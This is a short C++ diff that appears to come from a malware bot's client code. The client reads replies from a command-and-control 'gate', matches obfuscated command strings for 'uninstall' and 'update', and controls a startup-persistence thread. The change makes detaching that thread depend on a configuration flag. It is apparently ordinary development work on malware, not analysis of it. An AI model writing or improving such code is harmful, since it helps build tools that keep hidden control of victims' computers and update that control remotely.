@@ -92,12 +92,16 @@ public:
 				}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
-						startupPersistence.detach();
+						if (config.startup == "true") {
+							startupPersistence.detach();
+						}
 						Helpers::uninstall();
 						return;
 					}
 					else if (responseFromGate.find(OBFUSCATE("update")) != std::string::npos) {
-						startupPersistence.detach();
+						if (config.startup == "true") {
+							startupPersistence.detach();
+						}
 						std::vector<std::string> v = Helpers::explode(";", responseFromGate);
 						Helpers::update(v[2]);
 						return;
